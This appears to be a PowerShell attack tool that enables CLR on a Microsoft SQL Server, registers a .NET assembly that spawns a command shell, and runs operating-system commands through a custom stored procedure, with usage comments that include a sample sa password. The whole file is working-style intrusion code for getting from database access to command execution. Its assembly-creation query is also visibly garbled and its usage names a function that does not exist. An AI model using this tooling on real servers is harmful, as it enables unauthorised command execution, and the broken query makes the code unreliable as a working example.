# Instructions:
# Import the module: import-module [path]SeeClearly.ps1
# Create the custom Stored Procedure on the target: Add-CLRProcedure -Server MSSQL
# Or if you want to use local authentication: Add-CLRProcedure -Server MSSQL -Username sa -Password 'The$aPwd!'
# To execute commands: Invoke-CmdExec -Server MSSQL -Command "mkdir c:\temp"
# For more info visit sekirkity.com

function New-CLRProcedure() {
    [cmdletbinding(DefaultParameterSetName="integrated")]Param (
        [Parameter(Mandatory=$true)][string]$Server,
        [Parameter(Mandatory=$false)][string]$Database = 'msdb',
        [Parameter(Mandatory=$true, ParameterSetName="not_integrated")][string]$Username,
        [Parameter(Mandatory=$true, ParameterSetName="not_integrated")][string]$Password,
        [Parameter(Mandatory=$false, ParameterSetName="integrated")]$UseWindowsAuthentication = $true,
        [Parameter(Mandatory=$false)][int]$CommandTimeout=0
    )
	# The following Query contains a Dot Net assembly that spawns a command prompt process. Commands can then be executed using the Invoke-CmdExec cmdlet.
	# For the full C# code, visit sekirkity.com
	# VirusTotal link for Dot Net PE: https://www.virustotal.com/en/file/cf687b3484bdea5b79903ae09e4a1107106176f012becb9310dca07c22ce5adc/analysis/1486417110/
	$Queries = 'sp_configure @configname=clr_enabled, @configvalue=1;', 'RECONFIGURE;', 'CREATE ASSEMBLY [execcmdasm] AUTHORIZATION [dbo] FROM dbo].[cmd_exec] @execCommand NVARCHAR (MAX) AS EXTERNAL NAME [execcmdasm].[StoredProcedures].[cmd_exec];'
	$Conn = New-Object System.Data.SQLClient.SQLConnection
	$ConnString = "Server='$Server';Database='$Database';"
    If ($PSCmdlet.ParameterSetName -eq "not_integrated") { $ConnString += "User ID=$Username;Password=$Password;" }
    ElseIf ($PSCmdlet.ParameterSetName -eq "integrated") { $ConnString += "Trusted_Connection=Yes;Integrated Security=SSPI;" }
	$Conn.ConnectionString = $ConnString
	$Conn.Open()

	$Handler = [System.Data.SqlClient.SqlInfoMessageEventHandler] {param($sender, $event) Write-Host $event.Message }
	$Conn.add_InfoMessage($Handler); 
	$Conn.FireInfoMessageEventOnUserErrors = $true;

	foreach ($Query in $Queries)
	{
		$SqlCmd = New-Object System.Data.SQLClient.SQLCommand
		$SqlCmd.Connection = $Conn
		$SqlCmd.CommandText = $Query
		$SqlCmd.ExecuteScalar()
	}

	$Conn.Close()
}

function Invoke-CmdExec () {
    [cmdletbinding(DefaultParameterSetName="integrated")]Param (
        [Parameter(Mandatory=$true)][string]$Server,
        [Parameter(Mandatory=$false)][string]$Database = 'msdb',
        [Parameter(Mandatory=$true, ParameterSetName="not_integrated")][string]$Username,
        [Parameter(Mandatory=$true, ParameterSetName="not_integrated")][string]$Password,
        [Parameter(Mandatory=$false, ParameterSetName="integrated")]$UseWindowsAuthentication = $true,
        [Parameter(Mandatory=$true)][string]$Command,
        [Parameter(Mandatory=$false)][int]$CommandTimeout=0
	)
	$Query = "EXEC [dbo].[cmd_exec] '$Command';"
	$Conn = New-Object System.Data.SQLClient.SQLConnection
	$ConnString = "Server='$Server';Database='$Database';"
    If ($PSCmdlet.ParameterSetName -eq "not_integrated") { $ConnString += "User ID=$Username;Password=$Password;" }
    ElseIf ($PSCmdlet.ParameterSetName -eq "integrated") { $ConnString += "Trusted_Connection=Yes;Integrated Security=SSPI;" }
	$Conn.ConnectionString = $ConnString
	$Conn.Open()

	$Handler = [System.Data.SqlClient.SqlInfoMessageEventHandler] {param($sender, $event) Write-Host $event.Message }
	$Conn.add_InfoMessage($Handler); 
	$Conn.FireInfoMessageEventOnUserErrors = $true;

	$SqlCmd = New-Object System.Data.SQLClient.SQLCommand
	$SqlCmd.Connection = $Conn
	$SqlCmd.CommandText = $Query
	$SqlCmd.ExecuteScalar()
	
	$Conn.Close()
}
